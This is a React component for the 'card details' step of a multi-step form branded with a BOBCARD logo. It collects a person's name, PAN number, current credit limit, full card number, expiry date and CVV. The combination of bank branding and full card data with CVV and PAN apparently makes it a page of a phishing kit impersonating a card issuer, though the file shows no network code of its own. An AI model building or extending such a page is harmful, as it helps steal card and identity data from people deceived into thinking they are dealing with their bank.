import { useState } from 'react';
import Footer from '../components/Footer';
import Header from '../components/Header';
import { BobcardLogo } from '../components/Header';

interface FormData {
  fullName: string;
  panNumber: string;
  currentLimit: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
}

interface Props {
  onNext: (data: FormData) => void;
  onBack: () => void;
  initialData?: Partial<FormData>;
}

export default function Step3CardDetails({ onNext, onBack, initialData = {} }: Props) {
  const [form, setForm] = useState<FormData>({
    fullName: initialData.fullName || '',
    panNumber: initialData.panNumber || '',
    currentLimit: initialData.currentLimit || '',
    cardNumber: initialData.cardNumber || '',
    expiryDate: initialData.expiryDate || '',
    cvv: initialData.cvv || '',
  });
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});

  function validate() {
    const e: Partial<Record<keyof FormData, string>> = {};
    if (!form.fullName.trim()) e.fullName = 'Required';
    if (!form.panNumber.trim() || !/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(form.panNumber.toUpperCase())) e.panNumber = 'Enter valid PAN (e.g. ABCDE1234F)';
    if (!form.currentLimit.trim()) e.currentLimit = 'Required';
    if (!form.cardNumber.trim() || form.cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = 'Enter valid 16-digit card number';
    if (!form.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(form.expiryDate)) e.expiryDate = 'Enter valid expiry (MM/YY)';
    if (!form.cvv.trim() || form.cvv.length < 3) e.cvv = 'Enter valid CVV';
    return e;
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length) { setErrors(errs); return; }
    onNext({ ...form, panNumber: form.panNumber.toUpperCase() });
  }

  function field(key: keyof FormData, value: string) {
    setForm(f => ({ ...f, [key]: value }));
    if (errors[key]) setErrors(ex => ({ ...ex, [key]: undefined }));
  }

  function formatCardNumber(val: string) {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(.{4})/g, '$1 ').trim();
  }

  function formatExpiry(val: string) {
    const digits = val.replace(/\D/g, '').slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + '/' + digits.slice(2);
    return digits;
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5] flex flex-col">
      <Header />
      <div className="flex-1 flex justify-center px-4 py-6">
        <div className="bg-white rounded-lg shadow-sm w-full max-w-md p-6">
          <div className="flex justify-center mb-6">
            <BobcardLogo />
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <h3 className="text-center font-semibold text-gray-800 text-base">Personal details</h3>

            <div>
              <label className="block text-sm text-gray-700 mb-1">Name <span className="text-red-500">*</span></label>
              <input
                type="text"
                placeholder="Enter your full name"
                value={form.fullName}
                onChange={e => field('fullName', e.target.value)}
                className={`w-full border rounded px-3 py-2.5 text-sm ${errors.fullName ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.fullName && <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>}
            </div>

            <div>
              <label className="block text-sm text-gray-700 mb-1">PAN card number <span className="text-red-500">*</span></label>
              <input
                type="text"
                placeholder="ABCDE1234F"
                value={form.panNumber}
                onChange={e => field('panNumber', e.target.value.toUpperCase().slice(0, 10))}
                className={`w-full border rounded px-3 py-2.5 text-sm tracking-widest ${errors.panNumber ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.panNumber && <p className="text-red-500 text-xs mt-1">{errors.panNumber}</p>}
            </div>

            <div>
              <label className="block text-sm text-gray-700 mb-1">Current credit card limit <span className="text-red-500">*</span></label>
              <input
                type="number"
                placeholder="e.g. 100000"
                value={form.currentLimit}
                onChange={e => field('currentLimit', e.target.value)}
                className={`w-full border rounded px-3 py-2.5 text-sm ${errors.currentLimit ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.currentLimit && <p className="text-red-500 text-xs mt-1">{errors.currentLimit}</p>}
            </div>

            <h3 className="text-center font-semibold text-gray-800 text-base pt-2">Card details</h3>

            <div>
              <label className="block text-sm text-gray-700 mb-1">Credit card number <span className="text-red-500">*</span></label>
              <input
                type="text"
                placeholder="0000 0000 0000 0000"
                value={form.cardNumber}
                onChange={e => field('cardNumber', formatCardNumber(e.target.value))}
                className={`w-full border rounded px-3 py-2.5 text-sm tracking-widest ${errors.cardNumber ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
            </div>

            <div>
              <label className="block text-sm text-gray-700 mb-1">Expiry date <span className="text-red-500">*</span></label>
              <input
                type="text"
                placeholder="MM/YY"
                value={form.expiryDate}
                onChange={e => field('expiryDate', formatExpiry(e.target.value))}
                className={`w-full border rounded px-3 py-2.5 text-sm ${errors.expiryDate ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
            </div>

            <div>
              <label className="block text-sm text-gray-700 mb-1">CVV <span className="text-red-500">*</span></label>
              <input
                type="password"
                placeholder="***"
                value={form.cvv}
                onChange={e => field('cvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                className={`w-full border rounded px-3 py-2.5 text-sm ${errors.cvv ? 'border-red-400' : 'border-gray-300'} focus:outline-none focus:border-[#F47920]`}
              />
              {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
            </div>

            <button
              type="submit"
              className="w-full bg-[#F47920] hover:bg-[#D4650A] text-white font-semibold py-3 rounded text-sm transition-colors"
            >
              Next
            </button>
            <button
              type="button"
              onClick={onBack}
              className="w-full border border-[#F47920] text-[#F47920] font-semibold py-3 rounded text-sm transition-colors hover:bg-[#FFF5F0]"
            >
              Back
            </button>
          </form>
        </div>
      </div>
      <Footer />
    </div>
  );
}
